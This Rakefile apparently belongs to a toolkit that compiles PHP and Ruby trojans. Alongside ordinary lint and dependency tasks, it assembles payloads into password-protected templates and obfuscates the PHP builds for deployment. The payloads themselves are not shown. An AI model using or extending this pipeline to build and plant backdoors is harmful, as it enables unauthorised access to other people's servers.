require 'digest/sha1'
require 'erb'
require 'json'
require 'webrick'
include ERB::Util

namespace :check do
    desc "Checks system dependencies"
    task :dependencies do
        puts 'Checking shell dependencies...'
        satisfied          = true

        # check for system dependencies
        missing            = []
        shell_dependencies = %w[ack-grep gem grep nodejs npm php5 ruby]
        shell_dependencies.each do |d|
            if `which #{d}`.empty?
                puts "Missing: shell dependency #{d} is NOT installed." 
                missing.push d
                satisfied = false
            end
        end
        puts "Try: sudo apt-get install " + missing.join(" ") unless missing.empty?

        # check for gem dependencies
        missing          = []
        gem_dependencies = %w[jasmine]
        gem_dependencies.each do |d|
            if `which #{d}`.empty?
                puts "Missing: gem dependency #{d} is NOT installed." 
                missing.push d
                satisfied = false
            end
        end
        puts "Try: gem install " + missing.join(" ") unless missing.empty?

        # check for nodejs dependencies
        missing           = []
        node_dependencies = %w[jshint]
        node_dependencies.each do |d|
            if `which #{d}`.empty?
                puts "Missing: nodejs dependency #{d} is NOT installed." 
                missing.push d
                satisfied = false
            end
        end
        missing.each { |m| puts "Try: npm install -g #{m}" } unless missing.empty?

        puts "All dependencies appear to be satisfied." if satisfied
    end

    desc "Searches for todos and such in the source"
    task :todos do
        puts `ack-grep --norake "@todo" .`
        puts `ack-grep --norake "@bug" .`
        puts `ack-grep --norake "@kludge" .`
        puts `ack-grep --norake "@fixme" .`
    end
end

namespace :lint do

    #desc "Runs all source files through an appropriate linter"
    #task :all do
    #    Rake::Task['lint:js'].execute
    #    Rake::Task['lint:php'].execute
    #    Rake::Task['lint:ruby'].execute
    #end

    desc "Runs JavaScript files through jshint"
    task :js do
        puts 'Checking JavaScript files...'
        js_files = `find . -name vendor -prune -o -name '*.js' | grep -v 'vendor' | grep -v 'spec'`.split "\n"
        js_files.each do |f|
            lint_out = `jshint --config ./lib/build/jshint-config.json #{f}`
            # don't output empty lines which would otherwise be outputted
            # when a file contains no errors
            puts lint_out unless lint_out.strip!.to_s.empty?
        end
    end

    # @note: the PHP and Ruby linters aren't particularly helpful anymore,
    # given that they can't successfully parse the rb.erb/php.erb templates.
    # Since these linters are essentially just error-checkers rather than true
    # linters anyway, I'm commenting them out for now. I may either improve 
    # upon or remove them in the future.
    #desc "Runs PHP files through the linter (php -l)"
    #task :php do
    #    puts 'Checking PHP files...'
    #    puts `find . -iname '*.php' -print0 | xargs -0 -n1 -P10 php -l`
    #end

    #desc "Runs Ruby files through the linter (ruby -wc)"
    #task :ruby do
    #    puts 'Checking Ruby files...'
    #    puts `find . -iname '*.rb' -print0 | xargs -0 -n1 -P10 ruby -wc`
    #end
end


# @todo: I can probably metaprogram away some of the redundancy here
namespace :trojan do
    namespace :build do

        desc "Compiles all of the trojans"
        task :all do
            Rake::Task['trojan:build:php'].execute
            Rake::Task['trojan:build:ruby'].execute
        end

        desc "Compiles the PHP trojans"
        task :php do
            # notify the user
            puts 'Compiling PHP trojans....'

            # delete the old builds
            `rm ./trojan/bin/debug/php/*`
            `rm ./trojan/bin/deploy/php/*`

            # iterate over the PHP-spec trojans
            `ls ./trojan/spec/php`.split.each do |f|
                # buffer the erb parameters
                params = {}

                # load the specs
                trojan =  JSON::parse(File.read('./trojan/spec/php/' + f))

                # notify details
                print "Compiling '#{trojan['name']}'..."

                # calculate the password hash
                params[:password] = trojan['password']
                params[:salt]     = trojan['salt']
                params[:hash]     = Digest::SHA1.hexdigest(trojan['password'] + trojan['salt'])

                # load the trojan payloads
                params[:payloads] = ''
                trojan['payloads'].each do |payload|
                    payload_string = File.read('./trojan/template/php/payload/' + payload + '.php').strip
                    payload_string.sub!(/^<\?php/,'')
                    payload_string.sub!(/\?>$/,'')
                    params[:payloads] += payload_string
                end
                
                # compile the trojan's erb template
                erb = ERB.new(File.read('./trojan/template/php/chassis/' + trojan['chassis'] + '.php.erb' ), 0, '<>', 'buffer')

                # write the erb result to a debug file
                debug_file  = "./trojan/bin/debug/php/#{trojan['name']}.php"
                deploy_file = "./trojan/bin/deploy/php/#{trojan['name']}.php"

                f = File.new(debug_file, 'w')
                f.write(erb.result(binding))
                f.close

                # process the debug file with the PHP minifier and obfuscator
                `php -f ./lib/build/php/obfuscate.php '#{debug_file}' > '#{deploy_file}'`

                # complete
                puts 'done.'
            end
        end

        desc "Compiles the Ruby trojans"
        task :ruby do
            # notify the user
            puts 'Compiling Ruby trojans....'

            # delete the old builds
            `rm ./trojan/bin/debug/ruby/*`
            `rm ./trojan/bin/deploy/ruby/*`

            # iterate over the PHP-spec trojans
            `ls ./trojan/spec/ruby`.split.each do |f|
                # buffer the erb parameters
                params = {}

                # load the specs
                trojan =  JSON::parse(File.read('./trojan/spec/ruby/' + f))

                # notify details
                print "Compiling '#{trojan['name']}'..."

                # calculate the password hash
                params[:password] = trojan['password']
                params[:salt]     = trojan['salt']
                params[:hash]     = Digest::SHA1.hexdigest(trojan['password'] + trojan['salt'])

                # load the trojan payloads
                params[:payloads] = ''
                trojan['payloads'].each do |payload|
                    params[:payloads] +=  File.read('./trojan/template/ruby/payload/' + payload + '.rb')
                end
                
                # compile the trojan's erb template
                erb = ERB.new(File.read('./trojan/template/ruby/chassis/' + trojan['chassis'] + '.rb.erb' ), 0, '<>', 'buffer')

                # write the erb result to a debug file
                # @todo: obfuscate and minify
                #debug_file  = "./trojan/bin/debug/ruby/#{trojan['name']}.rb"
                deploy_file = "./trojan/bin/deploy/ruby/#{trojan['name']}.rb"

                f = File.new(deploy_file, 'w')
                f.write(erb.result(binding))
                f.close

                # set execute permissions on the compiled trojan
                File.chmod(0777, deploy_file)

                # process the debug file with the PHP minifier and obfuscator
                #`php -f ./lib/build/php/obfuscate.php '#{debug_file}' > '#{deploy_file}'`

                # complete
                puts 'done.'
            end
        end
    end
end

desc "Starts a local web server"
task :server do
    # configure the local webserver
    server = WEBrick::HTTPServer.new :Port => 1337
    server.mount "/", WEBrick::HTTPServlet::FileHandler, './'

    # configure shutdown
    trap('INT') { server.stop }

    # start
    server.start
end


begin
    require 'jasmine'
    load 'jasmine/tasks/jasmine.rake'
rescue LoadError
    task :jasmine do
        abort "Jasmine is not available. In order to run jasmine, you must: (sudo) gem install jasmine"
    end
end
